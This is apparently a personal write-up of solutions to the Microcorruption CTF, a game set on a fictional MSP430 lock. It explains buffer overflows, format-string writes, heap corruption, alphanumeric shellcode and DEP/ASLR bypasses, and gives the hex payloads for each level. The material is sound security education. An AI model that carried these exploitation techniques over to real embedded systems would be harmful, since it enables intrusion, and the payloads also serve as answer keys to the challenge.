### Introduction to Microcorruption

The CTF can be found at: https://microcorruption.com/about

We're connected to a fictional device that controls the door to a warehouse.
The goal is to find an input that unlocks the door lock.
The challenges are progressively hard.
Ranging from (for me) minutes, for the first ones, to days, for the last two.

Here are my solutions to the levels.
Some of them are far from optimal :-)

### Tutorial

The check_password() function counts the amount of characters.
Any password of length 8 is accepted.

**Password**: 1122334455667788

### New orleans

The password is stored at the memory address 0x2400.

**Password**: 3a5d736c24227c00

### Sydney

The same principle, just the password is hardcoded in the code
(using cmp instructions) not stored in memory.
When taking the word values from the code, remember that
msp430 is little endian, so the bytes in the memory are inverted.

**Password**: 5f3b6f2722544d5e

### Hanoi

We can't get our hands directly on the password because it's stored in the HSM.
The HSM checks the password and if it matches, it sets a byte in memory.
After test_password_valid function completes, a byte at address 0x2410
is checked against 0x70.
If it's equal, the door will be unlocked.
We can overwrite this byte by overflowing the password buffer with a long input.

**Password**: 4141414141414141414141414141414170

### Reykjavik

No HSM.
The device boasts with "military-grade encryption".
There are no debugging symbols for the most important code which resides at 0x2400.
The code is deciphered by the enc() function which includes code:
```
cmp #0xdb95, -0x24(r4)
```
Data on -0x24(r4) is the first two bytes of our input.
So this single cmp instruction verifies the password.

**Password**: 95db

### Cusco

We can exploit another stack buffer overflow.
The password is expected to take up to 16 characters.
The word at position 17, 18 is used as a return address from main.
We rewrite it to point to our shellcode.
Our payload can be just call unlock_door().

**Password**: b0124644414141414141414141414141ee43

### Addis Ababa

First printf() format vulnerability.
We will use %n format string to overwrite data in memory.
We can rewrite the byte which is later checked in main to unlock the door.

**Password**: 44362578256e

### Johannesburg

Checks strcpy() overflow by placing a canary 0xde after 16th character.
Word at password[19] is popped to pc after ret from main.
So setting this value to the address of unlock_door() solves the challenge.

**Password**: 4141414141414141414141414141414141de6645

### Santa Cruz

Password is copied after 16 bytes of the username.
Rewrite return address from main, bytes stored after password.
There are two 17 bytes buffer for the username and password
and between them are constants 8 and 16.
The length of the username/password is compared against them.
We can supply a username long enough to overwrite the return address
and also the two input limits so our data passes the size checks.
The return address from main will be popped to PC.

**Username**: 41414141414141414141414141414141410141414141414141414141414141414141414141413a463a463a463a463a46  
**Password**: 4242424242424242424242424242424242

### Jakarta

Username and password together can't be more than 32 characters.
The code treats the input length as a byte value and compares it to 0x21.
So any combined input longer than 0xff will pass this check because of the wrap.
We then simply rewrite the return address.

**Username**: 6161616161616161616161616161616161616161616161616161616161616161  
**Password**: 414141411c464141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141

### Montevideo

strcpy() again.
There's no unlock_door() function.
This time the password checking and unlocking is handled by the HSM.
However we can look in the manual (https://microcorruption.com/manual.pdf)
and write the unlocking code ourselves.
Calling interrupt 0x7f will do the trick.
Our original input is copied using strcpy() to a new location on 4400
and the original address is zeroed after that.
This means we can't use a zero byte in the password,
so this complicates situation a bit.
We can't just use mov 0x7f00 to r15.

So I borrowed the code from the actual executable:
```
0244 // address of the shellcode
0101 // value to be popped in r4
3441           pop	r4
3f40 7eff      mov	#0xff7e, r15
0f54           add	r4, r15
0f12           push	r15
b012 4c45      call	#0x454c <INT>
```

**Password**: 616161616161616161616161616161610244010134413f407eff0f540f12b0124c45

### Novosibirsk

printf() again.
Using the %n format string we can write a byte to an arbitrary memory location.
We will rewrite the byte which will be used to set sr in conditional_unlock_door
before calling INT.
This will unlock the door unconditionally.
We have to write 0x7f bytes with printf so the %n will write the same number
to a integer address on the stack.
Overwrite memory at address 44c8 to 7f.

**Password**: 1242c8442573256e61616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161

### Whitehorse

HSM-2 which unlocks the door only if the password matches.
Bytes 17,18 of password are popped to pc after return from main.
So we put there an address pointing to our password buffer.
**Password**: 414141414141414130127f00b01232458434

### Algiers

Heap corruption.
The memory for the username and password is allocated on heap.
We can overwrite the malloc metadata by passing a large input.
unlock_door() function is placed in memory directly after free().
We'll replace a ret at the end of free() by a "nop" instruction to slide
directly into unlock_door().

**Username**: 63636363636363636363636363636363444462452100  
**Password**: 41

### Lagos

The password can contain alphanumeric characters only.
So our shellcode has to be created using only these bytes.
There's some information about alphanumeric shellcode on MSP430:
https://gist.github.com/rmmh/8515577.
There are only indirect jumps, no way to write to memory
and not much other useful instructions.

The goal was to set sr to 0x007f and call interrupt.
I couldn't find any instructions to do that easily,
so I used this shellcode:
```
7a52 add.b #0x8, r10
(repeated many times to be close to 7f)
6a52 add.b #0x4, r10
6a53 add.b #0x2, r10
5a53 add.b #0x1, r10
4f4a mov.b r10, r15 
```

Then we need a lot of nop instructions so we advance PC enough
to call a indirect jump to 4604 at INT:
```
7734 jge $+0xf0
8f10           swpb	r15
024f           mov	r15, sr
32d0 0080      bis	#0x8000, sr
b012 1000      call	#0x10
```

Which unlocks the door.

**Password**: 41414141414141414141414141414141413044555542424242424242424242424242424242424242424343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343437a527a527a527a527a527a527a527a527a527a527a527a527a527a527a526a526a535a534f4a3452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234527734

### Vladivostok

strcpy() + printf() format string.
Password bytes 9 and 10 are popped to PC after ret
The code in memory is placed at a random address,
so we need an info leak to know where to jump.
Because the username is used directly as an argument to printf(),
we can use %x format string to leak data from stack,
We get address of printf() itself.
When we inspect the code in memory, we find that the other functions
are placed at the same offset as before the randomization.
INT is placed at a static offset from the print address (0x182).
So we place 007f on the stack and call INT.

**Username**: 25782578  
**Password**: 7f007f007f007f00----7f007f00
Replace --- by the address leaked by printf() plus 0x182.

### Bangalore

DEP.
We can overwrite PC as usual, but our data is mapped as not executable.
From manual, its possible to mark page as executable,
there's even function for that in the code.

We can easily overwrite the PC, however the memory where our shellcode
resides is readonly.
And there's no unlock_door to jump to, we need to launch our shellcode.
There's a function called mark_page_executable, which makes a memory page executable.
This is what we want to misuse.
We have to place an address of a memory page with our shellcode at the stack.
We control the stack so we point the return address to our now executable code.

We need the address of our code on the stack,
then jump to mark_page_executable and set that page as executable.
After ret from mark_page_executable, address of our shellcode is popped to PC.

**Password**: 10004400440044004400440044004400ba44400040000640324000ff104d0000

### Cernobyl

First impressions:
Input accepts up to 0x550 = 1360 characters, meaning the shellcode is expected to be huge.
The program uses a hash table, malloc.

The program accepts commands separated by semicolon:
```
new abc 1234 ; access abc 1234
```
Adds a user abc with a deactivated account.

create_hashtable() allocates data from memory address 5000.
The memory is allocated at the start.
There's a walk function to debug malloc.
We can corrupt malloc's data.
How to launch free()?
It's called from add_to_table() -> rehash().
To reach free() we must to hash more values to one bucket.

Malloc checks that the next block address isn't smaller than
the previous block, otherwise it thinks heap is exhausted.

Longest indirect jump is +35c, which isn't enough to reach my shellcode.
All the addresses seem to be a dead end.
The hash is computed from the full username length,
however, username is cut down to 15 + NUL byte.

We need input that'll hash to 0. bucket full length
and after rehash() to land in 2. bucket.

**Password**: 6e657720b012523f646464646464646464640d0620343b6e657720b012523f646464646464646464640d0620343b6e657720b012523f646464646464646464640d0620343b6e657720b012523f646464646464646464640d0620343b6e657720b012523f646464646464646464640d0620343b6e657720cc3dfc50b520343b6e6577206464646464646464646464646464646520343b6e6577206464646464646464646464646464646520343b6e6577206464646464646464646464646464646520343b6e6577206464646464646464646464646464646520343b6e6577206464646464646464646464646464646520343b6e6577206565656565656565656565656565656420343b6e6577206565656565656565656565656565656420343b6e6577206565656565656565656565656565656420343b6e6577206565656565656565656565656565656420343b6e6577206565656565656565656565656565656420343b44324000ffb0121000

### Hollywood

The code is randomized, there are no symbols.
We don't know where to place breakpoints,
so we have to step by hand.
I actually give this one up and came back later on.

However, only patience is needed to solve this one.

One of the first observations is that the program duration is
almost linearly dependent on the input size.
The longer the input, the longer the execution.
That's because the program generates a new code for each input byte.

Let's start debugging.
There are many loops which we can skip.
Once we realize that an instruction of importance is generated.
It loads the address of our input into a register!
When we go through the loop again and again,
we find an algorithm that performs computation on our input.
The generated algorithm is:
```
mov #2600 r5
clr r6
add @r5, r4
swpb r4
xor @r5+, r6
xor r4, r6
xor	r6, r4
tst	0x0(r5)
mov	sr, r7
and	#0x2, r7
rra	r7
xor	#0x1, r7
swpb	r7
rra	r7
sxt	r7
swpb	r7
sxt	r7
mov	#0x4b18, r8
and r7 r8
and #0x47aa, r7
add r7, r8
clr r7
mov r8, r12
cmp #0xfeb1, r4
mov sr, r7
clr r4
cmp #0x9298, r6
and sr, r7
clr r6
rra r7
or #0x1, r7
swpb r7
rra r7
rra r7
rra r7
rra r7
bis r7, sr
mov #0xff00, sr
call #0x10
```

The above code unlocks the lock, when proper conditions are met.
We have the algorithm at our hand,
so we can write a key generator to get a valid password.
Simple **hollywood-keygen.c** should be around.

**Password**: 4d4db1da96
